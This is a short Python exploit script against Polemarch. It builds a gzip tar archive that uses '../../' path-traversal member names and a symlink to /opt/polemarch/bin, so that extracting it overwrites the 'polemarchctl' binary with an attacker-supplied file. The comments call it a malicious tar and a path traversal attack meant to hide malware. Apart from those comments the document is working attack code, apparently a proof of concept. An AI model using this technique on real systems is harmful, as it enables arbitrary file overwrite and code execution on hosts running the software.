import tarfile
import os

# Directory to attack
#DIR_TARGET = "opt/"
DIR_TARGET = "/opt/polemarch/bin"

# Directory to hide malware
DIR_EXPLOIT= "docker"

# Directory containing symlink to attack folder
DIR_RELATIVE = "test"

# Tar name
TAR_NAME = "docker.tar"

def change_folder(tarinfo):
    tarinfo.name = f'../../{DIR_EXPLOIT}/{DIR_RELATIVE}'
    return tarinfo

def change_name(tarinfo):
    tarinfo.name = f'../../{DIR_EXPLOIT}/{DIR_RELATIVE}/{tarinfo.name}'
    return tarinfo


def main():
    # Create a simlink to the target directory
    try:
        os.symlink(f'/{DIR_TARGET}', DIR_RELATIVE, target_is_directory=True)
    except:
        # Already created
        pass

    # Create maliciuos tar using path traversal filter attack
    tar = tarfile.open(f'./tar/{TAR_NAME}', "w:gz")
    tar.add(DIR_RELATIVE, filter=change_folder)
    tar.add("polemarchctl", filter=change_name)
    tar.close()

    # Remove symlink
    os.remove(DIR_RELATIVE)

if __name__ == "__main__":
    main()